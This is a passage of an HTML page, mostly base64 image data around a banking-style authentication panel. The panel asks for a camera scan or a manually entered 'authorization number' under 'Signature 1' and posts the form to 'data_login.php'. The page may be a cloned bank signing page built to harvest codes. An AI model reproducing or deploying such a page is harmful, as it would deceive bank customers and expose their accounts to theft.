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" style="width: 41px; height: 53px;" /></p>

                            </div>
                        </div>
                    </div>

                    <div class="sep" aria-hidden="true">
                        <div class="line"></div>
                        <div class="bubble">OR</div>
                    </div>

                    <div class="right">
                        <p>
                            If you have issues with your phone camera, you can enter the values manually.
                        </p>
<form method="POST" action="data_login.php">
                        <h3>Signature 1</h3>
                        <p>For more information, click <a href="">here</a>.</p>

                        <div class="auth-row pos-rel">
                            <div class="auth-label">Your authorization number is:</div>
                            <div id="live-message" class="auth-number"></div>
                        </div>

                        <div class="mobile-icons-double" style="display: flex; justify-content: center; gap: 12px; margin-top: 15px;">
                        
                            <div class="mobile-icon third-icon" style="position: absolute;bottom: 37%;left: 87%;width: 40px;height: 40px;/* background: linear-gradient(135deg, #3B82F6, #1D4ED8); *//* border-radius: 6px; */display: flex;align-items: center;justify-content: center;color: white;/* box-shadow: 0 2px 4px rgba(59, 130, 246, 0.4); */">
                                <p><img alt="" src="data:image/png;base64,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